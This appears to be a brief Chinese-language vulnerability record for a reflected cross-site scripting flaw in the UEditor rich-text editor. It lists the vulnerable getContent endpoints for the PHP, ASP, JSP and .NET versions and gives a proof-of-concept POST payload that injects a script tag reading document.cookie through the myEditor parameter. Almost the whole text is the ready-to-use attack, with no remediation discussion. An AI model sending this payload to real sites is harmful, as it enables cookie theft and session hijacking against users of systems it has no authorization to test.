# Ueditor 反射型xss漏洞

## 漏洞地址：

/php/getContent.php
 /asp/getContent.asp
 /jsp/getContent.jsp
 /net/getContent.ashx

## 漏洞POC

POST:

```
myEditor=<script>alert(document.cookie)</script>
```

